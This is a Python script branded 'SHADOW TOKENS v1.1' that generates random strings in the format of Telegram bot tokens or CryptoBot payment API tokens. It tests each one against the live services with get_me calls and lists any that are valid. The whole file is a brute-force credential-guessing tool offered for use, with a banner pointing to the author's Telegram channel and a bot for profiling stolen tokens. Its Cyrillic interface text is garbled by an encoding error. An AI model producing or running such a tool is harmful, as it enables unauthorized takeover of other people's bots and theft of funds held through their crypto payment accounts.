import random
import string
import asyncio
from aiogram import Bot
from aiogram.utils.exceptions import TelegramAPIError
from aiocryptopay import AioCryptoPay, Networks

def generate_or_fetch_token(check_type):
    if check_type == '1':
        part1 = ''.join(random.choices(string.digits, k=10))
    elif check_type == '2':
        part1 = ''.join(random.choices(string.digits, k=6))
    part2 = 'AA' + random.choice(string.ascii_uppercase) + ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    token = f"{part1}:{part2}"
    return token

async def check_token_validity_with_aiocryptopay(token):
    crypto = AioCryptoPay(token=token, network=Networks.MAIN_NET)
    try:
        profile = await crypto.get_me()
        return True
    except Exception as e:
        return False
    finally:
        await crypto._session.close()

async def check_token_validity_telegram(token):
    bot = Bot(token=token)
    try:
        await bot.get_me()
        return True
    except TelegramAPIError:
        return False
    finally:
        session = await bot.get_session()
        await session.close()

async def main():
    print("\n=== üîê SHADOW TOKENS v1.1 ===")
    print("–†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫: @resilentss")
    print("–ö–∞–Ω–∞–ª: https://t.me/shadowbizz")
    print("==================================")
    print("–£–∑–Ω–∞—Ç—å –≤—Å—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤–∞–ª–∏–¥–Ω–æ–º —Ç–æ–∫–µ–Ω–µ: t.me/shadowtool_bot\n")
    print("==================================")

    try:
        num_tokens = int(input("–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ç–æ–∫–µ–Ω–æ–≤ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏: "))
    except ValueError:
        print("‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ.")
        return

    check_type = input("–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø –ø—Ä–æ–≤–µ—Ä–∫–∏ (1 - Telegram, 2 - CryptoBot): ")
    if check_type not in ['1', '2']:
        print("‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—ã–±–µ—Ä–∏—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –≤–∞—Ä–∏–∞–Ω—Ç (1 –∏–ª–∏ 2).")
        return

    print("\nüîç –ù–∞—á–∞–ª–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∏ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç–æ–∫–µ–Ω–æ–≤.\n")

    valid_tokens_count = 0
    valid_tokens = []

    for _ in range(num_tokens):
        token = generate_or_fetch_token(check_type)

        if check_type == '1':
            is_valid = await check_token_validity_telegram(token)
            if is_valid:
                valid_tokens_count += 1
                valid_tokens.append(token)
                print(f"‚úÖ –¢–æ–∫–µ–Ω {token} –≤–∞–ª–∏–¥–µ–Ω –¥–ª—è Telegram.")
            else:
                print(f"‚ùå –¢–æ–∫–µ–Ω {token} –Ω–µ –≤–∞–ª–∏–¥–µ–Ω –¥–ª—è Telegram.")
        elif check_type == '2':
            is_valid = await check_token_validity_with_aiocryptopay(token)
            if is_valid:
                valid_tokens_count += 1
                valid_tokens.append(token)
                print(f"‚úÖ –¢–æ–∫–µ–Ω {token} –≤–∞–ª–∏–¥–µ–Ω –¥–ª—è CryptoBot.")
            else:
                print(f"‚ùå –¢–æ–∫–µ–Ω {token} –Ω–µ –≤–∞–ª–∏–¥–µ–Ω –¥–ª—è CryptoBot.")

    print("\nüìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç–æ–∫–µ–Ω–æ–≤:")
    print(f"- –í—Å–µ–≥–æ —Ç–æ–∫–µ–Ω–æ–≤ –ø—Ä–æ–≤–µ—Ä–µ–Ω–æ: {num_tokens}")
    print(f"- –í–∞–ª–∏–¥–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤: {valid_tokens_count}")
    print(f"- –ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤: {num_tokens - valid_tokens_count}")

    if valid_tokens:
        print("\nüìú –°–ø–∏—Å–æ–∫ –≤–∞–ª–∏–¥–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤:")
        for token in valid_tokens:
            print(f"üîë {token}")

if __name__ == "__main__":
    asyncio.run(main())